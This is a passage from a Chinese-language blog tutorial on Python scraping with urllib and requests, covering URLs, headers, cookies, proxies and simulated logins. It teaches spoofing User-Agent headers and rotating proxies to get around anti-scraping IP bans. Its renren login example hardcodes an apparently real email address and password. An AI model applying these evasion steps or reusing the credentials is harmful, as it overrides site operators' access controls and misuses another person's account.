class="line">scheme://host:port/path/?query-string=xxx#anchor</span><br></pre></td></tr></table></figure><ul><li><strong>scheme</strong>：代表的是访问的协议，一般为<code>http</code>或者<code>https</code>以及<code>ftp</code>等。</li><li><strong>host</strong>：主机名，域名，比如<code>www.baidu.com</code>。</li><li><strong>port</strong>：端口号。当你访问一个网站的时候，浏览器默认使用80端口。</li><li><strong>path</strong>：查找路径。比如：<code>www.jianshu.com/trending/now</code>，后面的<code>trending/now</code>就是<code>path</code>。</li><li><strong>query-string</strong>：查询字符串，比如：<code>www.baidu.com/s?wd=python</code>，后面的<code>wd=python</code>就是查询字符串。</li><li><strong>anchor</strong>：锚点，后台一般不用管，前端用来做页面定位的。</li></ul><p>==在浏览器中请求一个<code>url</code>，浏览器会对这个url进行一个编码。除英文字母，数字和部分符号外，其他的全部使用百分号+十六进制码值进行编码。==</p><h2 id="常用的请求方法："><a class="header-anchor" href="#常用的请求方法：">¶</a>常用的请求方法：</h2><p>在<code>Http</code>协议中，定义了八种请求方法。这里介绍两种常用的请求方法，分别是<code>get</code>请求和<code>post</code>请求。</p><ol><li><code>get</code>请求：一般情况下，只从服务器获取数据下来，并不会对服务器资源产生任何影响的时候会使用<code>get</code>请求。</li><li><code>post</code>请求：向服务器发送数据（登录）、上传文件等，会对服务器资源产生影响的时候会使用<code>post</code>请求。<br>以上是在网站开发中常用的两种方法。并且一般情况下都会遵循使用的原则。但是有的网站和服务器为了做反爬虫机制，也经常会不按常理出牌，有可能一个应该使用<code>get</code>方法的请求就一定要改成<code>post</code>请求，这个要视情况而定。</li></ol><h2 id="请求头常见参数："><a class="header-anchor" href="#请求头常见参数：">¶</a>请求头常见参数：</h2><p>在<code>http</code>协议中，向服务器发送一个请求，数据分为三部分，第一个是把数据放在url中，第二个是把数据放在<code>body</code>中（在<code>post</code>请求中），第三个就是把数据放在<code>head</code>中。这里介绍在网络爬虫中经常会用到的一些请求头参数：</p><ol><li><code>User-Agent</code>：浏览器名称。这个在网络爬虫中经常会被使用到。请求一个网页的时候，服务器通过这个参数就可以知道这个请求是由哪种浏览器发送的。如果我们是通过爬虫发送请求，那么我们的<code>User-Agent</code>就是<code>Python</code>，这对于那些有反爬虫机制的网站来说，可以轻易的判断你这个请求是爬虫。因此我们要经常设置这个值为一些浏览器的值，来伪装我们的爬虫。</li><li><code>Referer</code>：表明当前这个请求是从哪个<code>url</code>过来的。这个一般也可以用来做反爬虫技术。如果不是从指定页面过来的，那么就不做相关的响应。</li><li><code>Cookie</code>：<code>http</code>协议是无状态的。也就是同一个人发送了两次请求，服务器没有能力知道这两个请求是否来自同一个人。因此这时候就用<code>cookie</code>来做标识。一般如果想要做登录后才能访问的网站，那么就需要发送<code>cookie</code>信息了。</li></ol><h2 id="常见响应状态码："><a class="header-anchor" href="#常见响应状态码：">¶</a>常见响应状态码：</h2><ol><li><code>200</code>：请求正常，服务器正常的返回数据。</li><li><code>301</code>：永久重定向。比如在访问<code>www.jingdong.com</code>的时候会重定向到<code>www.jd.com</code>。</li><li><code>302</code>：临时重定向。比如在访问一个需要登录的页面的时候，而此时没有登录，那么就会重定向到登录页面。</li><li><code>400</code>：请求的<code>url</code>在服务器上找不到。换句话说就是请求<code>url</code>错误。</li><li><code>403</code>：服务器拒绝访问，权限不够。</li><li><code>500</code>：服务器内部错误。可能是服务器出现<code>bug</code>了。</li></ol><h1>urllib库</h1><p><code>urllib</code>库是<code>Python</code>中一个最基本的网络请求库。可以模拟浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><h2 id="urlopen函数："><a class="header-anchor" href="#urlopen函数：">¶</a>urlopen函数：</h2><p>在<code>Python3</code>的<code>urllib</code>库中，所有和网络请求相关的方法，都被集到<code>urllib.request</code>模块下面了，以先来看下<code>urlopen</code>函数基本的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">resp = request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><p>实际上，使用浏览器访问百度，右键查看源代码。你会发现，跟我们刚才打印出来的数据是一模一样的。也就是说，上面的三行代码就已经帮我们把百度的首页的全部代码爬下来了。一个基本的url请求对应的python代码真的非常简单。<br>以下对<code>urlopen</code>函数的进行详细讲解：</p><ol><li><code>url</code>：请求的url。</li><li><code>data</code>：请求的<code>data</code>，如果设置了这个值，那么将变成<code>post</code>请求。</li><li>返回值：返回值是一个<code>http.client.HTTPResponse</code>对象，这个对象是一个类文件句柄对象。有<code>read(size)</code>、<code>readline</code>、<code>readlines</code>以及<code>getcode</code>等方法。</li></ol><h2 id="urlretrieve函数："><a class="header-anchor" href="#urlretrieve函数：">¶</a>urlretrieve函数：</h2><p>这个函数可以方便的将网页上的一个文件保存到本地。以下代码可以非常方便的将百度的首页下载到本地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">request.urlretrieve(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="string">&#x27;baidu.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="urlencode函数："><a class="header-anchor" href="#urlencode函数：">¶</a>urlencode函数：</h2><p>用浏览器发送请求的时候，==如果url中包含了中文或者其他特殊字符==，那么浏览器会自动的给我们进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这时候就应该使用<code>urlencode</code>函数来实现。<code>urlencode</code>可以把字典数据转换为<code>URL</code>编码的数据。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">data = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;爬虫基础&#x27;</span>,<span class="string">&#x27;greet&#x27;</span>:<span class="string">&#x27;hello world&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">100</span>&#125;</span><br><span class="line">qs = parse.urlencode(data)</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure><h2 id="parse-qs函数："><a class="header-anchor" href="#parse-qs函数：">¶</a>parse_qs函数：</h2><p>可以将经过编码后的url参数进行解码。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">qs = <span class="string">&quot;name=%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80&amp;greet=hello+world&amp;age=100&quot;</span></span><br><span class="line"><span class="built_in">print</span>(parse.parse_qs(qs))</span><br></pre></td></tr></table></figure><h2 id="urlparse和urlsplit："><a class="header-anchor" href="#urlparse和urlsplit：">¶</a>urlparse和urlsplit：</h2><p>有时候拿到一个url，想要对这个url中的各个组成部分进行分割，那么这时候就可以使用<code>urlparse</code>或者是<code>urlsplit</code>来进行分割。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?username=zhiliao&#x27;</span></span><br><span class="line"></span><br><span class="line">result = parse.urlsplit(url)</span><br><span class="line"><span class="comment"># result = parse.urlparse(url)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;scheme:&#x27;</span>,result.scheme)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;netloc:&#x27;</span>,result.netloc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;path:&#x27;</span>,result.path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;query:&#x27;</span>,result.query)</span><br></pre></td></tr></table></figure><p><code>urlparse</code>和<code>urlsplit</code>基本上是一模一样的。==唯一不一样的地方是，<code>urlparse</code>里面多了一个<code>params</code>属性，而<code>urlsplit</code>没有这个<code>params</code>属性==。比如有一个<code>url</code>为：<code>url = 'http://www.baidu.com/s;hello?wd=python&amp;username=abc#1'</code>，那么<code>urlparse</code>可以获取到<code>hello</code>，而<code>urlsplit</code>不可以获取到。<code>url</code>中的<code>params</code>也用得比较少。</p><h2 id="request-Request类："><a class="header-anchor" href="#request-Request类：">¶</a>request.Request类：</h2><p>如果想要在请求的时候增加一些请求头，那么就必须使用<code>request.Request</code>类来实现。比如要增加一个<code>User-Agent</code>，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&quot;http://www.baidu.com/&quot;</span>,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="ProxyHandler处理器（代理设置）"><a class="header-anchor" href="#ProxyHandler处理器（代理设置）">¶</a>ProxyHandler处理器（代理设置）</h2><p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP的访问。<br>所以我们可以设置一些代理服务器，每隔一段时间换一个代理，就算IP被禁止，依然可以换个IP继续爬取。<br>urllib中通过ProxyHandler来设置使用代理服务器，下面代码说明如何使用自定义opener来使用代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是没有使用代理的</span></span><br><span class="line"><span class="comment"># resp = request.urlopen(&#x27;http://httpbin.org/get&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp.read().decode(&quot;utf-8&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是使用了代理的</span></span><br><span class="line">handler = request.ProxyHandler(&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;218.66.161.88:31769&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line">req = request.Request(<span class="string">&quot;http://httpbin.org/ip&quot;</span>)</span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="“科学上网”代理"><a class="header-anchor" href="#“科学上网”代理">¶</a>“科学上网”代理</h2><p>查看当前使用的代理ip以及开放的端口，开放端口用<code>shodan</code>一般就可以搜到，也可以用<code>nmap</code>去扫描，VPN协议端口有三类，略去</p><h1>cookie相关：</h1><h2 id="cookie的格式："><a class="header-anchor" href="#cookie的格式：">¶</a>cookie的格式：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: NAME=VALUE；Expires/Max-age=DATE；Path=PATH；Domain=DOMAIN_NAME；SECURE</span><br></pre></td></tr></table></figure><p>参数意义：</p><ul><li>NAME：cookie的名字。</li><li>VALUE：cookie的值。</li><li>Expires：cookie的过期时间。</li><li>Path：cookie作用的路径。</li><li>Domain：cookie作用的域名。</li><li>SECURE：是否只在https协议下起作用。</li></ul><h2 id="使用cookielib库和HTTPCookieProcessor模拟登录："><a class="header-anchor" href="#使用cookielib库和HTTPCookieProcessor模拟登录：">¶</a>使用cookielib库和HTTPCookieProcessor模拟登录：</h2><p>Cookie 是指网站服务器为了辨别用户身份和进行Session跟踪，而储存在用户浏览器上的文本文件，Cookie可以保持登录信息到用户下次与服务器的会话。<br>这里以人人网为例。人人网中，要访问某个人的主页，必须先登录才能访问，登录说白了就是要有cookie信息。那么如果我们想要用代码的方式访问，就必须要有正确的cookie信息才能访问。<br>解决方案有两种，第一种是使用浏览器访问，然后将cookie信息复制下来，放到headers中。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;略去&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>但是每次在访问需要cookie的页面都要从浏览器中复制cookie比较麻烦。在Python处理Cookie，一般是通过<code>http.cookiejar</code>模块和<code>urllib模块的HTTPCookieProcessor</code>处理器类一起使用。<code>http.cookiejar</code>模块主要作用是提供用于存储cookie的对象。而<code>HTTPCookieProcessor</code>处理器主要作用是处理这些cookie对象，并构建handler对象。</p><h2 id="http-cookiejar模块："><a class="header-anchor" href="#http-cookiejar模块：">¶</a>http.cookiejar模块：</h2><p>该模块主要的类有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。这四个类的作用分别如下：</p><ol><li>CookieJar：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。</li><li>FileCookieJar (filename,delayload=None,policy=None)：从CookieJar派生而来，用来创建FileCookieJar实例，检索cookie信息并将cookie存储到文件中。filename是存储cookie的文件名。delayload为True时支持延迟访问访问文件，即只有在需要时才读取文件或在文件中存储数据。</li><li>MozillaCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与Mozilla浏览器 cookies.txt兼容的FileCookieJar实例。</li><li>LWPCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与libwww-perl标准的 Set-Cookie3 文件格式兼容的FileCookieJar实例。</li></ol><h2 id="登录人人网："><a class="header-anchor" href="#登录人人网：">¶</a>登录人人网：</h2><p>利用<code>http.cookiejar</code>和<code>request.HTTPCookieProcessor</code>登录人人网。相关示例代码如下：（经测试人人网已经不能这样爬了，仅作一例）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opener</span>():</span></span><br><span class="line">    cookiejar = CookieJar()</span><br><span class="line">    handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">    opener = request.build_opener(handler)</span><br><span class="line">    <span class="keyword">return</span> opener</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_renren</span>(<span class="params">opener</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;970138074@qq.com&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    login_url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">    req = request.Request(login_url, headers=headers, data=data)</span><br><span class="line">    opener.<span class="built_in">open</span>(req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_profile</span>(<span class="params">opener</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line">    req = request.Request(url,headers=headers)</span><br><span class="line">    resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opener = get_opener()</span><br><span class="line">    login_renren(opener)</span><br><span class="line">    visit_profile(opener)//同一个opener，存了先前访问的cookie</span><br></pre></td></tr></table></figure><h2 id="保存cookie到本地："><a class="header-anchor" href="#保存cookie到本地：">¶</a>保存cookie到本地：</h2><p>保存<code>cookie</code>到本地，可以使用<code>cookiejar</code>的<code>save</code>方法，并且需要指定一个文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br><span class="line">cookiejar.save(ignore_discard=<span class="literal">True</span>,ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="从本地加载cookie："><a class="header-anchor" href="#从本地加载cookie：">¶</a>从本地加载cookie：</h2><p>从本地加载<code>cookie</code>，需要使用<code>cookiejar</code>的<code>load</code>方法，并且也需要指定方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">cookiejar.load(ignore_expires=<span class="literal">True</span>,ignore_discard=<span class="literal">True</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h1>requests库</h1><p>虽然Python的标准库中 urllib模块已经包含了平常我们使用的大多数功能，但是它的 API 使用起来让人感觉不太好，而 Requests宣传是 “HTTP for Humans”，说明使用更简洁方便。</p><h2 id="安装和文档地址："><a class="header-anchor" href="#安装和文档地址：">¶</a>安装和文档地址：</h2><p>利用<code>pip</code>可以非常方便的安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>中文文档：<a href="http://docs.python-requests.org/zh_CN/latest/index.html">http://docs.python-requests.org/zh_CN/latest/index.html</a><br>github地址：<a href="https://github.com/requests/requests">https://github.com/requests/requests</a></p><h2 id="发送GET请求："><a class="header-anchor" href="#发送GET请求：">¶</a>发送GET请求：</h2><ol><li><p>最简单的发送<code>get</code>请求就是通过<code>requests.get</code>来调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>添加headers和查询参数：<br>如果想添加 headers，可以传入headers参数来增加请求头中的headers信息。如果要将参数放在url中传递，可以利用 params 参数。相关示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;中国&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/s&quot;</span>, params = kw, headers = headers)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.content返回的字节流数据</span></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span>(response.url)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span>(response.encoding)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应码</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br></pre></td></tr></table></figure></li></ol><h2 id="发送POST请求："><a class="header-anchor" href="#发送POST请求：">¶</a>发送POST请求：</h2><ol><li><p>最基本的POST请求可以使用<code>post</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>,data=data)</span><br></pre></td></tr></table></figure></li><li><p>传入data数据：<br>这时候就不要再使用<code>urlencode</code>进行编码了，直接传入一个字典进去就可以了。比如请求拉勾网的数据的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line">   </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># 如果是json数据，直接可以调用json方法</span></span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用代理："><a class="header-anchor" href="#使用代理：">¶</a>使用代理：</h2><p>使用<code>requests</code>添加代理也非常简单，只要在请求的方法中（比如<code>get</code>或者<code>post</code>）传递<code>proxies</code>参数就可以了。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 